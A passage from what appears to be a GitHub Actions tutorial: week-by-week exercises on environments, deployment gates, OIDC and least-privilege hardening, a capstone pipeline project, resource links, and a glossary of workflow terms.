- [ ] Add a matrix over three language versions with `fail-fast: false`.
- [ ] Write to `$GITHUB_STEP_SUMMARY` and see it on the run page.

### Week 3 — Environments and deployment

- [ ] Create `staging` and `production` environments in Settings.
- [ ] Give each a variable with the same name and different values; prove the job picks up the right one.
- [ ] Add required reviewers to `production`; watch a job wait, then approve it.
- [ ] Add a deployment branch policy limiting `production` to `main`; try deploying from a feature branch and observe the failure.
- [ ] Add a 2-minute wait timer and watch the countdown.
- [ ] Build a full `build → dev → staging → production` promotion pipeline that deploys **one** artifact.
- [ ] Add a `concurrency` group so deploys queue instead of overlapping.

### Week 4 — Advanced

- [ ] Extract shared steps into a local composite action.
- [ ] Convert a deploy job into a reusable workflow and call it twice.
- [ ] Set up OIDC to a cloud provider and delete a long-lived secret.
- [ ] Add `permissions:` blocks and reduce to least privilege.
- [ ] Pin every third-party action to a SHA and enable Dependabot for Actions.
- [ ] Add service containers and write one real integration test.
- [ ] Build a dynamic matrix with `fromJSON`.
- [ ] Add a PR preview environment with an auto-comment and teardown.
- [ ] Write a rollback workflow and actually use it.

### Capstone project

Build a complete pipeline for a small web app:

1. On PR: lint, typecheck, unit tests (matrix), integration tests with a real DB, build, and a preview deploy commented on the PR.
2. On merge to main: build a Docker image once, push to GHCR with provenance attestation, deploy to `staging` automatically, run smoke tests.
3. Gate `production` behind required reviewers and a `main`-only branch policy; deploy the same image digest.
4. Use OIDC for all cloud auth — zero long-lived cloud secrets.
5. Add a `workflow_dispatch` rollback workflow.
6. Post the deployment summary to `$GITHUB_STEP_SUMMARY` and Slack.

If you can build that, you know GitHub Actions.

### Resources

- Official docs: `docs.github.com/actions` — the reference for workflow syntax and contexts is the page to bookmark
- Workflow syntax reference: `docs.github.com/actions/reference/workflow-syntax-for-github-actions`
- Security hardening guide: `docs.github.com/actions/security-guides/security-hardening-for-github-actions`
- Marketplace: `github.com/marketplace?type=actions`
- `github.com/actions/starter-workflows` — official templates
- `github.blog/changelog/` filtered to Actions — how you stay current
- `actionlint` (`github.com/rhysd/actionlint`), `act` (`github.com/nektos/act`)
- Read the workflows in big open-source repos; it's the best source of real patterns.

---

## 24. Glossary

**Action** — reusable packaged code invoked with `uses:`.
**Artifact** — files uploaded from a run, downloadable and shareable between jobs.
**Cache** — stored dependencies to speed up later runs; non-authoritative.
**Composite action** — an action made of YAML steps.
**Concurrency group** — named lock limiting simultaneous runs.
**Context** — structured data available to expressions (`github`, `secrets`, `needs`…).
**Deployment** — a record GitHub creates when a job targets an environment.
**Environment** — named deployment target carrying protection rules, secrets, and history.
**Event** — the repository or external occurrence that triggers a workflow.
**Expression** — `${{ }}` syntax evaluated before a step runs.
**GITHUB_TOKEN** — auto-generated, repo-scoped, short-lived token for each run.
**Job** — a set of steps on one runner.
**Matrix** — strategy for running a job across many variable combinations.
**OIDC** — OpenID Connect; lets a workflow exchange a signed identity token for short-lived cloud credentials.
**Protection rule** — a gate on an environment (reviewers, wait timer, branch policy).
**Pwn request** — attack exploiting `pull_request_target` + fork checkout to steal secrets.
**Reusable workflow** — a workflow callable from another via `jobs.<id>.uses`.
**Runner** — the machine executing a job.
**Self-hosted runner** — a runner you own and maintain.
**Service container** — a Docker container (DB, cache) running alongside a job.
**Step** — one command (`run`) or action call (`uses`) inside a job.
**Workflow** — a YAML file in `.github/workflows/` defining automation.
**Workflow run** — one execution of a workflow.
